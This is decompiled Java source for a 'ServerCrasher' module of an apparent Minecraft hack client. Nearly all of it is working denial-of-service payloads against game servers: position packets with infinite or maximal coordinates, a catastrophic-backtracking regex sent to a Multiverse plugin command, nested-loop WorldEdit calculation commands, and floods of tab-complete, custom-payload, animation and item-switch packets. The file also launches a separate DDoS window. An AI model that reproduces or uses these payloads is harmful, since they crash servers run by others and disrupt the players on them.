/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  net.minecraft.client.Minecraft
 *  net.minecraft.network.Packet
 *  net.minecraft.network.PacketBuffer
 *  net.minecraft.network.play.client.CPacketAnimation
 *  net.minecraft.network.play.client.CPacketCustomPayload
 *  net.minecraft.network.play.client.CPacketHeldItemChange
 *  net.minecraft.network.play.client.CPacketPlayer$Position
 *  net.minecraft.network.play.client.CPacketTabComplete
 *  net.minecraft.util.EnumHand
 *  net.minecraft.util.math.BlockPos
 *  net.minecraftforge.fml.common.gameevent.TickEvent$ClientTickEvent
 *  net.minecraftforge.fml.common.gameevent.TickEvent$PlayerTickEvent
 *  org.apache.commons.lang3.RandomUtils
 */
package zelix.hack.hacks;

import io.netty.buffer.Unpooled;
import java.util.Random;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketHeldItemChange;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketTabComplete;
import net.minecraft.util.EnumHand;
import net.minecraft.util.math.BlockPos;
import net.minecraftforge.fml.common.gameevent.TickEvent;
import org.apache.commons.lang3.RandomUtils;
import zelix.gui.others.DDOSWindow;
import zelix.hack.Hack;
import zelix.hack.HackCategory;
import zelix.utils.Wrapper;
import zelix.value.Mode;
import zelix.value.ModeValue;
import zelix.value.NumberValue;

public class ServerCrasher
extends Hack {
    ModeValue mode;
    public static NumberValue threadNum;
    public static NumberValue delay;
    private Object example;
    private Minecraft mc = Wrapper.INSTANCE.mc();

    public ServerCrasher() {
        super("ServerCrasher", HackCategory.ANOTHER);
        threadNum = new NumberValue("Thread", 1.0, 1.0, 128.0);
        this.mode = new ModeValue("Mode", new Mode("mathoverflow", true), new Mode("multiversecore", false), new Mode("ZwxDDOS", false), new Mode("TabComplete", false), new Mode("Infinity", false), new Mode("WorldEdit", false), new Mode("Session", false), new Mode("OP", false), new Mode("WorldEdit2", false), new Mode("xACK", false), new Mode("IllegalSwitcher", false));
        delay = new NumberValue("Delay", 1000.0, 1.0, 5000.0);
        this.addValue(this.mode, threadNum, delay);
    }

    @Override
    public void onEnable() {
        if (this.mode.getMode("ZwxDDOS").isToggled()) {
            DDOSWindow.main(null);
        }
        super.onEnable();
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }

    @Override
    public void onPlayerTick(TickEvent.PlayerTickEvent e) {
        if (this.mode.getMode("mathoverflow").isToggled()) {
            Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Wrapper.INSTANCE.player().onGround));
        } else if (this.mode.getMode("multiversecore").isToggled()) {
            Wrapper.INSTANCE.player().sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^");
        }
    }

    @Override
    public void onClientTick(TickEvent.ClientTickEvent event) {
        block17: {
            block19: {
                block18: {
                    block16: {
                        if (!this.mode.getMode("TabComplete").isToggled()) break block16;
                        int i = 0;
                        while ((double)i < (Double)ServerCrasher.delay.value) {
                            double rand1 = RandomUtils.nextDouble((double)0.0, (double)Double.MAX_VALUE);
                            double rand2 = RandomUtils.nextDouble((double)0.0, (double)Double.MAX_VALUE);
                            double rand3 = RandomUtils.nextDouble((double)0.0, (double)Double.MAX_VALUE);
                            this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketTabComplete("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e", new BlockPos(rand1, rand2, rand3), false));
                            ++i;
                        }
                        break block17;
                    }
                    if (!this.mode.getMode("Infinity").isToggled()) break block18;
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, new Random().nextBoolean()));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, new Random().nextBoolean()));
                    break block17;
                }
                if (!this.mode.getMode("WorldEdit").isToggled()) break block19;
                if (this.mc.thePlayer.ticksExisted % 6 != 0) break block17;
                this.mc.thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.thePlayer.sendChatMessage("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.thePlayer.sendChatMessage("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.thePlayer.sendChatMessage("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                this.mc.thePlayer.sendChatMessage("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                break block17;
            }
            if (this.mode.getMode("Session").isToggled()) {
                for (int i = 0; i < 500; ++i) {
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("MC|BOpen", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("MC|TrList", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("MC|TrSel", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("MC|BEdit", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("MC|BSign", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).writeString("\ub6e0\ub395\uace2\u9086\u8ee2\u9787\ubee1\u8b89\ua2d2\ubae0\u3a92\u6f68\u7275\u6c67\u7361\u3a73\uade0\u93a9\u88e3\ua989\ub2e1\ub98e")));
                }
            } else if (this.mode.getMode("OP").isToggled()) {
                for (int i = 0; i < 250; ++i) {
                    this.mc.thePlayer.sendChatMessage("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager");
                }
            } else if (this.mode.getMode("WorldEdit2").isToggled()) {
                for (int i = 0; i < 250; ++i) {
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketCustomPayload("WECUI", new PacketBuffer(Unpooled.buffer()).writeString("\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI XUI")));
                }
            } else if (this.mode.getMode("xACK").isToggled()) {
                for (int i = 0; i < 5000; ++i) {
                    this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketAnimation(EnumHand.OFF_HAND));
                }
            } else if (this.mode.getMode("IllegalSwitcher").isToggled()) {
                for (int i = 0; i < 550; ++i) {
                    for (int i2 = 0; i2 < 8; ++i2) {
                        this.mc.thePlayer.sendQueue.addToSendQueue((Packet)new CPacketHeldItemChange(i2));
                    }
                }
            }
        }
    }
}

